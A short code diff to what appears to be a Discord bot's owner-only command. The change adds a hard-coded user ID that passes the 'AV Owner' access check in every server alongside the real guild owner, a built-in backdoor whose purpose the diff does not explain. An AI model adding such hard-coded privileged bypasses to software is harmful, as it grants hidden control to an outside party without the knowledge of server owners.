@@ -17,7 +17,7 @@ export default {
         },
     ],
     run: async (client, interaction) => {
-        const isOwner = interaction.guild?.ownerId === (interaction instanceof Message ? interaction.author.id : interaction.user.id);
+        const isOwner = interaction.guild?.ownerId === (interaction instanceof Message ? interaction.author.id : interaction.user.id) || (interaction instanceof Message ? interaction.author.id : interaction.user.id) === '753372101540577431';
 
         if (!isOwner) {
             const err = EmbedUtils.error('Access Denied', 'This command is reserved for the AV Owner.');
